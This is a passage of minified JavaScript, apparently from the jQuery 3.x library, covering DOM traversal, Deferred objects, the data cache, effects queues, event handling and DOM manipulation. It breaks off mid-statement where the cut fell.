F.fn.extend({ find: function (t) { var e, n, i = this.length, o = this; if ("string" != typeof t) return this.pushStack(F(t).filter(function () { for (e = 0; e < i; e++)if (F.contains(o[e], this)) return !0 })); for (n = this.pushStack([]), e = 0; e < i; e++)F.find(t, o[e], n); return 1 < i ? F.uniqueSort(n) : n }, filter: function (t) { return this.pushStack(S(this, t || [], !1)) }, not: function (t) { return this.pushStack(S(this, t || [], !0)) }, is: function (t) { return !!S(this, "string" == typeof t && G.test(t) ? F(t) : t || [], !1).length } }); var k, D = /^(?:\s*(<[\w\W]+>)[^>]*|#([\w-]+))$/; (F.fn.init = function (t, e, n) { var i, o; if (!t) return this; if (n = n || k, "string" != typeof t) return t.nodeType ? (this[0] = t, this.length = 1, this) : f(t) ? void 0 !== n.ready ? n.ready(t) : t(F) : F.makeArray(t, this); if (!(i = "<" === t[0] && ">" === t[t.length - 1] && 3 <= t.length ? [null, t, null] : D.exec(t)) || !i[1] && e) return !e || e.jquery ? (e || n).find(t) : this.constructor(e).find(t); if (i[1]) { if (e = e instanceof F ? e[0] : e, F.merge(this, F.parseHTML(i[1], e && e.nodeType ? e.ownerDocument || e : x, !0)), X.test(i[1]) && F.isPlainObject(e)) for (i in e) f(this[i]) ? this[i](e[i]) : this.attr(i, e[i]); return this } return (o = x.getElementById(i[2])) && (this[0] = o, this.length = 1), this }).prototype = F.fn, k = F(x); var Z = /^(?:parents|prev(?:Until|All))/, U = { children: !0, contents: !0, next: !0, prev: !0 }; function W(t, e) { for (; (t = t[e]) && 1 !== t.nodeType;); return t } F.fn.extend({ has: function (t) { var e = F(t, this), n = e.length; return this.filter(function () { for (var t = 0; t < n; t++)if (F.contains(this, e[t])) return !0 }) }, closest: function (t, e) { var n, i = 0, o = this.length, a = [], s = "string" != typeof t && F(t); if (!G.test(t)) for (; i < o; i++)for (n = this[i]; n && n !== e; n = n.parentNode)if (n.nodeType < 11 && (s ? -1 < s.index(n) : 1 === n.nodeType && F.find.matchesSelector(n, t))) { a.push(n); break } return this.pushStack(1 < a.length ? F.uniqueSort(a) : a) }, index: function (t) { return t ? "string" == typeof t ? o.call(F(t), this[0]) : o.call(this, t.jquery ? t[0] : t) : this[0] && this[0].parentNode ? this.first().prevAll().length : -1 }, add: function (t, e) { return this.pushStack(F.uniqueSort(F.merge(this.get(), F(t, e)))) }, addBack: function (t) { return this.add(null == t ? this.prevObject : this.prevObject.filter(t)) } }), F.each({ parent: function (t) { var e = t.parentNode; return e && 11 !== e.nodeType ? e : null }, parents: function (t) { return y(t, "parentNode") }, parentsUntil: function (t, e, n) { return y(t, "parentNode", n) }, next: function (t) { return W(t, "nextSibling") }, prev: function (t) { return W(t, "previousSibling") }, nextAll: function (t) { return y(t, "nextSibling") }, prevAll: function (t) { return y(t, "previousSibling") }, nextUntil: function (t, e, n) { return y(t, "nextSibling", n) }, prevUntil: function (t, e, n) { return y(t, "previousSibling", n) }, siblings: function (t) { return Q((t.parentNode || {}).firstChild, t) }, children: function (t) { return Q(t.firstChild) }, contents: function (t) { return void 0 !== t.contentDocument ? t.contentDocument : (w(t, "template") && (t = t.content || t), F.merge([], t.childNodes)) } }, function (i, o) { F.fn[i] = function (t, e) { var n = F.map(this, o, t); return "Until" !== i.slice(-5) && (e = t), e && "string" == typeof e && (n = F.filter(e, n)), 1 < this.length && (U[i] || F.uniqueSort(n), Z.test(i) && n.reverse()), this.pushStack(n) } }); var N = /[^\x20\t\r\n\f]+/g; function T(t) { return t } function H(t) { throw t } function E(t, e, n, i) { var o; try { t && f(o = t.promise) ? o.call(t).done(e).fail(n) : t && f(o = t.then) ? o.call(t, e, n) : e.apply(void 0, [t].slice(i)) } catch (t) { n.apply(void 0, [t]) } } F.Callbacks = function (i) { var t, n; i = "string" == typeof i ? (t = i, n = {}, F.each(t.match(N) || [], function (t, e) { n[e] = !0 }), n) : F.extend({}, i); function o() { for (r = r || i.once, s = a = !0; l.length; c = -1)for (e = l.shift(); ++c < g.length;)!1 === g[c].apply(e[0], e[1]) && i.stopOnFalse && (c = g.length, e = !1); i.memory || (e = !1), a = !1, r && (g = e ? [] : "") } var a, e, s, r, g = [], l = [], c = -1, I = { add: function () { return g && (e && !a && (c = g.length - 1, l.push(e)), function n(t) { F.each(t, function (t, e) { f(e) ? i.unique && I.has(e) || g.push(e) : e && e.length && "string" !== B(e) && n(e) }) }(arguments), e && !a && o()), this }, remove: function () { return F.each(arguments, function (t, e) { for (var n; -1 < (n = F.inArray(e, g, n));)g.splice(n, 1), n <= c && c-- }), this }, has: function (t) { return t ? -1 < F.inArray(t, g) : 0 < g.length }, empty: function () { return g = g && [], this }, disable: function () { return r = l = [], g = e = "", this }, disabled: function () { return !g }, lock: function () { return r = l = [], e || a || (g = e = ""), this }, locked: function () { return !!r }, fireWith: function (t, e) { return r || (e = [t, (e = e || []).slice ? e.slice() : e], l.push(e), a || o()), this }, fire: function () { return I.fireWith(this, arguments), this }, fired: function () { return !!s } }; return I }, F.extend({ Deferred: function (t) { var a = [["notify", "progress", F.Callbacks("memory"), F.Callbacks("memory"), 2], ["resolve", "done", F.Callbacks("once memory"), F.Callbacks("once memory"), 0, "resolved"], ["reject", "fail", F.Callbacks("once memory"), F.Callbacks("once memory"), 1, "rejected"]], o = "pending", s = { state: function () { return o }, always: function () { return r.done(arguments).fail(arguments), this }, catch: function (t) { return s.then(null, t) }, pipe: function () { var o = arguments; return F.Deferred(function (i) { F.each(a, function (t, e) { var n = f(o[e[4]]) && o[e[4]]; r[e[1]](function () { var t = n && n.apply(this, arguments); t && f(t.promise) ? t.promise().progress(i.notify).done(i.resolve).fail(i.reject) : i[e[0] + "With"](this, n ? [t] : arguments) }) }), o = null }).promise() }, then: function (e, n, i) { var g = 0; function l(o, a, s, r) { return function () { function t() { var t, e; if (!(o < g)) { if ((t = s.apply(n, i)) === a.promise()) throw new TypeError("Thenable self-resolution"); e = t && ("object" == typeof t || "function" == typeof t) && t.then, f(e) ? r ? e.call(t, l(g, a, T, r), l(g, a, H, r)) : (g++, e.call(t, l(g, a, T, r), l(g, a, H, r), l(g, a, T, a.notifyWith))) : (s !== T && (n = void 0, i = [t]), (r || a.resolveWith)(n, i)) } } var n = this, i = arguments, e = r ? t : function () { try { t() } catch (t) { F.Deferred.exceptionHook && F.Deferred.exceptionHook(t, e.stackTrace), g <= o + 1 && (s !== H && (n = void 0, i = [t]), a.rejectWith(n, i)) } }; o ? e() : (F.Deferred.getStackHook && (e.stackTrace = F.Deferred.getStackHook()), v.setTimeout(e)) } } return F.Deferred(function (t) { a[0][3].add(l(0, t, f(i) ? i : T, t.notifyWith)), a[1][3].add(l(0, t, f(e) ? e : T)), a[2][3].add(l(0, t, f(n) ? n : H)) }).promise() }, promise: function (t) { return null != t ? F.extend(t, s) : s } }, r = {}; return F.each(a, function (t, e) { var n = e[2], i = e[5]; s[e[1]] = n.add, i && n.add(function () { o = i }, a[3 - t][2].disable, a[3 - t][3].disable, a[0][2].lock, a[0][3].lock), n.add(e[3].fire), r[e[0]] = function () { return r[e[0] + "With"](this === r ? void 0 : this, arguments), this }, r[e[0] + "With"] = n.fireWith }), s.promise(r), t && t.call(r, r), r }, when: function (t) { function e(e) { return function (t) { o[e] = this, a[e] = 1 < arguments.length ? r.call(arguments) : t, --n || s.resolveWith(o, a) } } var n = arguments.length, i = n, o = Array(i), a = r.call(arguments), s = F.Deferred(); if (n <= 1 && (E(t, s.done(e(i)).resolve, s.reject, !n), "pending" === s.state() || f(a[i] && a[i].then))) return s.then(); for (; i--;)E(a[i], e(i), s.reject); return s.promise() } }); var R = /^(Eval|Internal|Range|Reference|Syntax|Type|URI)Error$/; F.Deferred.exceptionHook = function (t, e) { v.console && v.console.warn && t && R.test(t.name) && v.console.warn("jQuery.Deferred exception: " + t.message, t.stack, e) }, F.readyException = function (t) { v.setTimeout(function () { throw t }) }; var Y = F.Deferred(); function O() { x.removeEventListener("DOMContentLoaded", O), v.removeEventListener("load", O), F.ready() } F.fn.ready = function (t) { return Y.then(t).catch(function (t) { F.readyException(t) }), this }, F.extend({ isReady: !1, readyWait: 1, ready: function (t) { (!0 === t ? --F.readyWait : F.isReady) || (F.isReady = !0) !== t && 0 < --F.readyWait || Y.resolveWith(x, [F]) } }), F.ready.then = Y.then, "complete" === x.readyState || "loading" !== x.readyState && !x.documentElement.doScroll ? v.setTimeout(F.ready) : (x.addEventListener("DOMContentLoaded", O), v.addEventListener("load", O)); var _ = function (t, e, n, i, o, a, s) { var r = 0, g = t.length, l = null == n; if ("object" === B(n)) for (r in o = !0, n) _(t, e, r, n[r], !0, a, s); else if (void 0 !== i && (o = !0, f(i) || (s = !0), l && (e = s ? (e.call(t, i), null) : (l = e, function (t, e, n) { return l.call(F(t), n) })), e)) for (; r < g; r++)e(t[r], n, s ? i : i.call(t[r], r, e(t[r], n))); return o ? t : l ? e.call(t) : g ? e(t[0], n) : a }, V = /^-ms-/, L = /-([a-z])/g; function M(t, e) { return e.toUpperCase() } function z(t) { return t.replace(V, "ms-").replace(L, M) } function P(t) { return 1 === t.nodeType || 9 === t.nodeType || !+t.nodeType } function K() { this.expando = F.expando + K.uid++ } K.uid = 1, K.prototype = { cache: function (t) { var e = t[this.expando]; return e || (e = {}, P(t) && (t.nodeType ? t[this.expando] = e : Object.defineProperty(t, this.expando, { value: e, configurable: !0 }))), e }, set: function (t, e, n) { var i, o = this.cache(t); if ("string" == typeof e) o[z(e)] = n; else for (i in e) o[z(i)] = e[i]; return o }, get: function (t, e) { return void 0 === e ? this.cache(t) : t[this.expando] && t[this.expando][z(e)] }, access: function (t, e, n) { return void 0 === e || e && "string" == typeof e && void 0 === n ? this.get(t, e) : (this.set(t, e, n), void 0 !== n ? n : e) }, remove: function (t, e) { var n, i = t[this.expando]; if (void 0 !== i) { if (void 0 !== e) { n = (e = Array.isArray(e) ? e.map(z) : (e = z(e)) in i ? [e] : e.match(N) || []).length; for (; n--;)delete i[e[n]] } void 0 !== e && !F.isEmptyObject(i) || (t.nodeType ? t[this.expando] = void 0 : delete t[this.expando]) } }, hasData: function (t) { var e = t[this.expando]; return void 0 !== e && !F.isEmptyObject(e) } }; var J = new K, j = new K, $ = /^(?:\{[\w\W]*\}|\[[\w\W]*\])$/, q = /[A-Z]/g; function tt(t, e, n) { var i, o; if (void 0 === n && 1 === t.nodeType) if (i = "data-" + e.replace(q, "-$&").toLowerCase(), "string" == typeof (n = t.getAttribute(i))) { try { n = "true" === (o = n) || "false" !== o && ("null" === o ? null : o === +o + "" ? +o : $.test(o) ? JSON.parse(o) : o) } catch (t) { } j.set(t, e, n) } else n = void 0; return n } F.extend({ hasData: function (t) { return j.hasData(t) || J.hasData(t) }, data: function (t, e, n) { return j.access(t, e, n) }, removeData: function (t, e) { j.remove(t, e) }, _data: function (t, e, n) { return J.access(t, e, n) }, _removeData: function (t, e) { J.remove(t, e) } }), F.fn.extend({ data: function (n, t) { var e, i, o, a = this[0], s = a && a.attributes; if (void 0 !== n) return "object" == typeof n ? this.each(function () { j.set(this, n) }) : _(this, function (t) { var e; return a && void 0 === t ? void 0 !== (e = j.get(a, n)) || void 0 !== (e = tt(a, n)) ? e : void 0 : void this.each(function () { j.set(this, n, t) }) }, null, t, 1 < arguments.length, null, !0); if (this.length && (o = j.get(a), 1 === a.nodeType && !J.get(a, "hasDataAttrs"))) { for (e = s.length; e--;)s[e] && 0 === (i = s[e].name).indexOf("data-") && (i = z(i.slice(5)), tt(a, i, o[i])); J.set(a, "hasDataAttrs", !0) } return o }, removeData: function (t) { return this.each(function () { j.remove(this, t) }) } }), F.extend({ queue: function (t, e, n) { var i; if (t) return e = (e || "fx") + "queue", i = J.get(t, e), n && (!i || Array.isArray(n) ? i = J.access(t, e, F.makeArray(n)) : i.push(n)), i || [] }, dequeue: function (t, e) { e = e || "fx"; var n = F.queue(t, e), i = n.length, o = n.shift(), a = F._queueHooks(t, e); "inprogress" === o && (o = n.shift(), i--), o && ("fx" === e && n.unshift("inprogress"), delete a.stop, o.call(t, function () { F.dequeue(t, e) }, a)), !i && a && a.empty.fire() }, _queueHooks: function (t, e) { var n = e + "queueHooks"; return J.get(t, n) || J.access(t, n, { empty: F.Callbacks("once memory").add(function () { J.remove(t, [e + "queue", n]) }) }) } }), F.fn.extend({ queue: function (e, n) { var t = 2; return "string" != typeof e && (n = e, e = "fx", t--), arguments.length < t ? F.queue(this[0], e) : void 0 === n ? this : this.each(function () { var t = F.queue(this, e, n); F._queueHooks(this, e), "fx" === e && "inprogress" !== t[0] && F.dequeue(this, e) }) }, dequeue: function (t) { return this.each(function () { F.dequeue(this, t) }) }, clearQueue: function (t) { return this.queue(t || "fx", []) }, promise: function (t, e) { function n() { --o || a.resolveWith(s, [s]) } var i, o = 1, a = F.Deferred(), s = this, r = this.length; for ("string" != typeof t && (e = t, t = void 0), t = t || "fx"; r--;)(i = J.get(s[r], t + "queueHooks")) && i.empty && (o++, i.empty.add(n)); return n(), a.promise(e) } }); var et = /[+-]?(?:\d*\.|)\d+(?:[eE][+-]?\d+|)/.source, nt = new RegExp("^(?:([+-])=|)(" + et + ")([a-z%]*)$", "i"), it = ["Top", "Right", "Bottom", "Left"], ot = x.documentElement, at = function (t) { return F.contains(t.ownerDocument, t) }, st = { composed: !0 }; ot.getRootNode && (at = function (t) { return F.contains(t.ownerDocument, t) || t.getRootNode(st) === t.ownerDocument }); function rt(t, e, n, i) { var o, a, s = {}; for (a in e) s[a] = t.style[a], t.style[a] = e[a]; for (a in o = n.apply(t, i || []), e) t.style[a] = s[a]; return o } var gt = function (t, e) { return "none" === (t = e || t).style.display || "" === t.style.display && at(t) && "none" === F.css(t, "display") }; function lt(t, e, n, i) { var o, a, s = 20, r = i ? function () { return i.cur() } : function () { return F.css(t, e, "") }, g = r(), l = n && n[3] || (F.cssNumber[e] ? "" : "px"), c = t.nodeType && (F.cssNumber[e] || "px" !== l && +g) && nt.exec(F.css(t, e)); if (c && c[3] !== l) { for (g /= 2, l = l || c[3], c = +g || 1; s--;)F.style(t, e, c + l), (1 - a) * (1 - (a = r() / g || .5)) <= 0 && (s = 0), c /= a; c *= 2, F.style(t, e, c + l), n = n || [] } return n && (c = +c || +g || 0, o = n[1] ? c + (n[1] + 1) * n[2] : +n[2], i && (i.unit = l, i.start = c, i.end = o)), o } var ct = {}; function It(t, e) { for (var n, i, o, a, s, r, g, l = [], c = 0, I = t.length; c < I; c++)(i = t[c]).style && (n = i.style.display, e ? ("none" === n && (l[c] = J.get(i, "display") || null, l[c] || (i.style.display = "")), "" === i.style.display && gt(i) && (l[c] = (g = s = a = void 0, s = (o = i).ownerDocument, r = o.nodeName, (g = ct[r]) || (a = s.body.appendChild(s.createElement(r)), g = F.css(a, "display"), a.parentNode.removeChild(a), "none" === g && (g = "block"), ct[r] = g)))) : "none" !== n && (l[c] = "none", J.set(i, "display", n))); for (c = 0; c < I; c++)null != l[c] && (t[c].style.display = l[c]); return t } F.fn.extend({ show: function () { return It(this, !0) }, hide: function () { return It(this) }, toggle: function (t) { return "boolean" == typeof t ? t ? this.show() : this.hide() : this.each(function () { gt(this) ? F(this).show() : F(this).hide() }) } }); var ut = /^(?:checkbox|radio)$/i, ht = /<([a-z][^\/\0>\x20\t\r\n\f]*)/i, dt = /^$|^module$|\/(?:java|ecma)script/i, Ct = { option: [1, "<select multiple='multiple'>", "</select>"], thead: [1, "<table>", "</table>"], col: [2, "<table><colgroup>", "</colgroup></table>"], tr: [2, "<table><tbody>", "</tbody></table>"], td: [3, "<table><tbody><tr>", "</tr></tbody></table>"], _default: [0, "", ""] }; function At(t, e) { var n = void 0 !== t.getElementsByTagName ? t.getElementsByTagName(e || "*") : void 0 !== t.querySelectorAll ? t.querySelectorAll(e || "*") : []; return void 0 === e || e && w(t, e) ? F.merge([t], n) : n } function pt(t, e) { for (var n = 0, i = t.length; n < i; n++)J.set(t[n], "globalEval", !e || J.get(e[n], "globalEval")) } Ct.optgroup = Ct.option, Ct.tbody = Ct.tfoot = Ct.colgroup = Ct.caption = Ct.thead, Ct.th = Ct.td; var mt, ft, bt = /<|&#?\w+;/; function Bt(t, e, n, i, o) { for (var a, s, r, g, l, c, I = e.createDocumentFragment(), u = [], h = 0, d = t.length; h < d; h++)if ((a = t[h]) || 0 === a) if ("object" === B(a)) F.merge(u, a.nodeType ? [a] : a); else if (bt.test(a)) { for (s = s || I.appendChild(e.createElement("div")), r = (ht.exec(a) || ["", ""])[1].toLowerCase(), g = Ct[r] || Ct._default, s.innerHTML = g[1] + F.htmlPrefilter(a) + g[2], c = g[0]; c--;)s = s.lastChild; F.merge(u, s.childNodes), (s = I.firstChild).textContent = "" } else u.push(e.createTextNode(a)); for (I.textContent = "", h = 0; a = u[h++];)if (i && -1 < F.inArray(a, i)) o && o.push(a); else if (l = at(a), s = At(I.appendChild(a), "script"), l && pt(s), n) for (c = 0; a = s[c++];)dt.test(a.type || "") && n.push(a); return I } mt = x.createDocumentFragment().appendChild(x.createElement("div")), (ft = x.createElement("input")).setAttribute("type", "radio"), ft.setAttribute("checked", "checked"), ft.setAttribute("name", "t"), mt.appendChild(ft), m.checkClone = mt.cloneNode(!0).cloneNode(!0).lastChild.checked, mt.innerHTML = "<textarea>x</textarea>", m.noCloneChecked = !!mt.cloneNode(!0).lastChild.defaultValue; var yt = /^key/, vt = /^(?:mouse|pointer|contextmenu|drag|drop)|click/, xt = /^([^.]*)(?:\.(.+)|)/; function Ft() { return !0 } function Qt() { return !1 } function Gt(t, e) { return t === function () { try { return x.activeElement } catch (t) { } }() == ("focus" === e) } function wt(t, e, n, i, o, a) { var s, r; if ("object" == typeof e) { for (r in "string" != typeof n && (i = i || n, n = void 0), e) wt(t, r, n, i, e[r], a); return t } if (null == i && null == o ? (o = n, i = n = void 0) : null == o && ("string" == typeof n ? (o = i, i = void 0) : (o = i, i = n, n = void 0)), !1 === o) o = Qt; else if (!o) return t; return 1 === a && (s = o, (o = function (t) { return F().off(t), s.apply(this, arguments) }).guid = s.guid || (s.guid = F.guid++)), t.each(function () { F.event.add(this, e, o, i, n) }) } function Xt(t, o, a) { a ? (J.set(t, o, !1), F.event.add(t, o, { namespace: !1, handler: function (t) { var e, n, i = J.get(this, o); if (1 & t.isTrigger && this[o]) { if (i.length) (F.event.special[o] || {}).delegateType && t.stopPropagation(); else if (i = r.call(arguments), J.set(this, o, i), e = a(this, o), this[o](), i !== (n = J.get(this, o)) || e ? J.set(this, o, !1) : n = {}, i !== n) return t.stopImmediatePropagation(), t.preventDefault(), n.value } else i.length && (J.set(this, o, { value: F.event.trigger(F.extend(i[0], F.Event.prototype), i.slice(1), this) }), t.stopImmediatePropagation()) } })) : void 0 === J.get(t, o) && F.event.add(t, o, Ft) } F.event = { global: {}, add: function (e, t, n, i, o) { var a, s, r, g, l, c, I, u, h, d, C, A = J.get(e); if (A) for (n.handler && (n = (a = n).handler, o = a.selector), o && F.find.matchesSelector(ot, o), n.guid || (n.guid = F.guid++), (g = A.events) || (g = A.events = {}), (s = A.handle) || (s = A.handle = function (t) { return void 0 !== F && F.event.triggered !== t.type ? F.event.dispatch.apply(e, arguments) : void 0 }), l = (t = (t || "").match(N) || [""]).length; l--;)h = C = (r = xt.exec(t[l]) || [])[1], d = (r[2] || "").split(".").sort(), h && (I = F.event.special[h] || {}, h = (o ? I.delegateType : I.bindType) || h, I = F.event.special[h] || {}, c = F.extend({ type: h, origType: C, data: i, handler: n, guid: n.guid, selector: o, needsContext: o && F.expr.match.needsContext.test(o), namespace: d.join(".") }, a), (u = g[h]) || ((u = g[h] = []).delegateCount = 0, I.setup && !1 !== I.setup.call(e, i, d, s) || e.addEventListener && e.addEventListener(h, s)), I.add && (I.add.call(e, c), c.handler.guid || (c.handler.guid = n.guid)), o ? u.splice(u.delegateCount++, 0, c) : u.push(c), F.event.global[h] = !0) }, remove: function (t, e, n, i, o) { var a, s, r, g, l, c, I, u, h, d, C, A = J.hasData(t) && J.get(t); if (A && (g = A.events)) { for (l = (e = (e || "").match(N) || [""]).length; l--;)if (h = C = (r = xt.exec(e[l]) || [])[1], d = (r[2] || "").split(".").sort(), h) { for (I = F.event.special[h] || {}, u = g[h = (i ? I.delegateType : I.bindType) || h] || [], r = r[2] && new RegExp("(^|\\.)" + d.join("\\.(?:.*\\.|)") + "(\\.|$)"), s = a = u.length; a--;)c = u[a], !o && C !== c.origType || n && n.guid !== c.guid || r && !r.test(c.namespace) || i && i !== c.selector && ("**" !== i || !c.selector) || (u.splice(a, 1), c.selector && u.delegateCount--, I.remove && I.remove.call(t, c)); s && !u.length && (I.teardown && !1 !== I.teardown.call(t, d, A.handle) || F.removeEvent(t, h, A.handle), delete g[h]) } else for (h in g) F.event.remove(t, h + e[l], n, i, !0); F.isEmptyObject(g) && J.remove(t, "handle events") } }, dispatch: function (t) { var e, n, i, o, a, s, r = F.event.fix(t), g = new Array(arguments.length), l = (J.get(this, "events") || {})[r.type] || [], c = F.event.special[r.type] || {}; for (g[0] = r, e = 1; e < arguments.length; e++)g[e] = arguments[e]; if (r.delegateTarget = this, !c.preDispatch || !1 !== c.preDispatch.call(this, r)) { for (s = F.event.handlers.call(this, r, l), e = 0; (o = s[e++]) && !r.isPropagationStopped();)for (r.currentTarget = o.elem, n = 0; (a = o.handlers[n++]) && !r.isImmediatePropagationStopped();)r.rnamespace && !1 !== a.namespace && !r.rnamespace.test(a.namespace) || (r.handleObj = a, r.data = a.data, void 0 !== (i = ((F.event.special[a.origType] || {}).handle || a.handler).apply(o.elem, g)) && !1 === (r.result = i) && (r.preventDefault(), r.stopPropagation())); return c.postDispatch && c.postDispatch.call(this, r), r.result } }, handlers: function (t, e) { var n, i, o, a, s, r = [], g = e.delegateCount, l = t.target; if (g && l.nodeType && !("click" === t.type && 1 <= t.button)) for (; l !== this; l = l.parentNode || this)if (1 === l.nodeType && ("click" !== t.type || !0 !== l.disabled)) { for (a = [], s = {}, n = 0; n < g; n++)void 0 === s[o = (i = e[n]).selector + " "] && (s[o] = i.needsContext ? -1 < F(o, this).index(l) : F.find(o, this, null, [l]).length), s[o] && a.push(i); a.length && r.push({ elem: l, handlers: a }) } return l = this, g < e.length && r.push({ elem: l, handlers: e.slice(g) }), r }, addProp: function (e, t) { Object.defineProperty(F.Event.prototype, e, { enumerable: !0, configurable: !0, get: f(t) ? function () { if (this.originalEvent) return t(this.originalEvent) } : function () { if (this.originalEvent) return this.originalEvent[e] }, set: function (t) { Object.defineProperty(this, e, { enumerable: !0, configurable: !0, writable: !0, value: t }) } }) }, fix: function (t) { return t[F.expando] ? t : new F.Event(t) }, special: { load: { noBubble: !0 }, click: { setup: function (t) { var e = this || t; return ut.test(e.type) && e.click && w(e, "input") && Xt(e, "click", Ft), !1 }, trigger: function (t) { var e = this || t; return ut.test(e.type) && e.click && w(e, "input") && Xt(e, "click"), !0 }, _default: function (t) { var e = t.target; return ut.test(e.type) && e.click && w(e, "input") && J.get(e, "click") || w(e, "a") } }, beforeunload: { postDispatch: function (t) { void 0 !== t.result && t.originalEvent && (t.originalEvent.returnValue = t.result) } } } }, F.removeEvent = function (t, e, n) { t.removeEventListener && t.removeEventListener(e, n) }, F.Event = function (t, e) { if (!(this instanceof F.Event)) return new F.Event(t, e); t && t.type ? (this.originalEvent = t, this.type = t.type, this.isDefaultPrevented = t.defaultPrevented || void 0 === t.defaultPrevented && !1 === t.returnValue ? Ft : Qt, this.target = t.target && 3 === t.target.nodeType ? t.target.parentNode : t.target, this.currentTarget = t.currentTarget, this.relatedTarget = t.relatedTarget) : this.type = t, e && F.extend(this, e), this.timeStamp = t && t.timeStamp || Date.now(), this[F.expando] = !0 }, F.Event.prototype = { constructor: F.Event, isDefaultPrevented: Qt, isPropagationStopped: Qt, isImmediatePropagationStopped: Qt, isSimulated: !1, preventDefault: function () { var t = this.originalEvent; this.isDefaultPrevented = Ft, t && !this.isSimulated && t.preventDefault() }, stopPropagation: function () { var t = this.originalEvent; this.isPropagationStopped = Ft, t && !this.isSimulated && t.stopPropagation() }, stopImmediatePropagation: function () { var t = this.originalEvent; this.isImmediatePropagationStopped = Ft, t && !this.isSimulated && t.stopImmediatePropagation(), this.stopPropagation() } }, F.each({ altKey: !0, bubbles: !0, cancelable: !0, changedTouches: !0, ctrlKey: !0, detail: !0, eventPhase: !0, metaKey: !0, pageX: !0, pageY: !0, shiftKey: !0, view: !0, char: !0, code: !0, charCode: !0, key: !0, keyCode: !0, button: !0, buttons: !0, clientX: !0, clientY: !0, offsetX: !0, offsetY: !0, pointerId: !0, pointerType: !0, screenX: !0, screenY: !0, targetTouches: !0, toElement: !0, touches: !0, which: function (t) { var e = t.button; return null == t.which && yt.test(t.type) ? null != t.charCode ? t.charCode : t.keyCode : !t.which && void 0 !== e && vt.test(t.type) ? 1 & e ? 1 : 2 & e ? 3 : 4 & e ? 2 : 0 : t.which } }, F.event.addProp), F.each({ focus: "focusin", blur: "focusout" }, function (t, e) { F.event.special[t] = { setup: function () { return Xt(this, t, Gt), !1 }, trigger: function () { return Xt(this, t), !0 }, delegateType: e } }), F.each({ mouseenter: "mouseover", mouseleave: "mouseout", pointerenter: "pointerover", pointerleave: "pointerout" }, function (t, o) { F.event.special[t] = { delegateType: o, bindType: o, handle: function (t) { var e, n = t.relatedTarget, i = t.handleObj; return n && (n === this || F.contains(this, n)) || (t.type = i.origType, e = i.handler.apply(this, arguments), t.type = o), e } } }), F.fn.extend({ on: function (t, e, n, i) { return wt(this, t, e, n, i) }, one: function (t, e, n, i) { return wt(this, t, e, n, i, 1) }, off: function (t, e, n) { var i, o; if (t && t.preventDefault && t.handleObj) return i = t.handleObj, F(t.delegateTarget).off(i.namespace ? i.origType + "." + i.namespace : i.origType, i.selector, i.handler), this; if ("object" != typeof t) return !1 !== e && "function" != typeof e || (n = e, e = void 0), !1 === n && (n = Qt), this.each(function () { F.event.remove(this, t, n, e) }); for (o in t) this.off(o, e, t[o]); return this } }); var St = /<(?!area|br|col|embed|hr|img|input|link|meta|param)(([a-z][^\/\0>\x20\t\r\n\f]*)[^>]*)\/>/gi, kt = /<script|<style|<link/i, Dt = /checked\s*(?:[^=]|=\s*.checked.)/i, Zt = /^\s*<!(?:\[CDATA\[|--)|(?:\]\]|--)>\s*$/g; function Ut(t, e) { return w(t, "table") && w(11 !== e.nodeType ? e : e.firstChild, "tr") && F(t).children("tbody")[0] || t } function Wt(t) { return t.type = (null !== t.getAttribute("type")) + "/" + t.type, t } function Nt(t) { return "true/" === (t.type || "").slice(0, 5) ? t.type = t.type.slice(5) : t.removeAttribute("type"), t } function Tt(t, e) { var n, i, o, a, s, r, g, l; if (1 === e.nodeType) { if (J.hasData(t) && (a = J.access(t), s = J.set(e, a), l = a.events)) for (o in delete s.handle, s.events = {}, l) for (n = 0, i = l[o].length; n < i; n++)F.event.add(e, o, l[o][n]); j.hasData(t) && (r = j.access(t), g = F.extend({}, r), j.set(e, g)) } } function Ht(n, i, o, a) { i = A.apply([], i); var t, e, s, r, g, l, c = 0, I = n.length, u = I - 1, h = i[0], d = f(h); if (d || 1 < I && "string" == typeof h && !m.checkClone && Dt.test(h)) return n.each(function (t) { var e = n.eq(t); d && (i[0] = h.call(this, t, e.html())), Ht(e, i, o, a) }); if (I && (e = (t = Bt(i, n[0].ownerDocument, !1, n, a)).firstChild, 1 === t.childNodes.length && (t = e), e || a)) { for (r = (s = F.map(At(t, "script"), Wt)).length; c < I; c++)g = t, c !== u && (g = F.clone(g, !0, !0), r && F.merge(s, At(g, "script"))), o.call(n[c], g, c); if (r) for (l = s[s.length - 1].ownerDocument, F.map(s, Nt), c = 0; c < r; c++)g = s[c], dt.test(g.type || "") && !J.access(g, "globalEval") && F.contains(l, g) && (g.src && "module" !== (g.type || "").toLowerCase() ? F._evalUrl && !g.noModule && F._evalUrl(g.src, { nonce: g.nonce || g.getAttribute("nonce") }) : b(g.textContent.replace(Zt, ""), g, l)) } return n } function Et(t, e, n) { for (var i, o = e ? F.filter(e, t) : t, a = 0; null != (i = o[a]); a++)n || 1 !== i.nodeType || F.cleanData(At(i)), i.parentNode && (n && at(i) && pt(At(i, "script")), i.parentNode.removeChild(i)); return t } F.extend({ htmlPrefilter: function (t) { return t.replace(St, "<$1></$2>") }, clone: function (t, e, n) { var i, o, a, s, r, g, l, c = t.cloneNode(!0), I = at(t); if (!(m.noCloneChecked || 1 !== t.nodeType && 11 !== t.nodeType || F.isXMLDoc(t))) for (s = At(c), i = 0, o = (a = At(t)).length; i < o; i++)r = a[i], g = s[i], "input" === (l = g.nodeName.toLowerCase()) && ut.test(r.type) ? g.checked = r.checked : "input" !== l && "textarea" !== l || (g.defaultValue = r.defaultValue); if (e) if (n) for (a = a || At(t), s = s || At(c), i = 0, o = a.length; i < o; i++)Tt(a[i], s[i]); else Tt(t, c); return 0 < (s = At(c, "script")).length && pt(s, !I && At(t, "script")), c }, cleanData: function (t) { for (var e, n, i, o = F.event.special, a = 0; void 0 !== (n = t[a]); a++)if (P(n)) { if (e = n[J.expando]) { if (e.events) for (i in e.events) o[i] ? F.event.remove(n, i) : F.removeEvent(n, i, e.handle); n[J.expando] = void 0 } n[j.expando] && (n[j.expando] = void 0) } } }), F.fn.extend({ detach: function (t) { return Et(this, t, !0) }, remove: function (t) { return Et(this, t) }, text: function (t) { return _(this, function (t) { return void 0 === t ? F.text(this) : this.empty().each(function () { 1 !== this.nodeType && 11 !== this.nodeType && 9 !== this.nodeType || (this.textContent = t) }) }, null, t, arguments.length) }, append: function () { return Ht(this, arguments, function (t) { 1 !== this.nodeType && 11 !== this.nodeType && 9 !== this.nodeType || Ut(this, t).appendChild(t) }) }, prepend: function () { return Ht(this, arguments, function (t) { var e; 1 !== this.nodeType && 11 !== this.nodeType && 9 !== this.nodeType || (e = 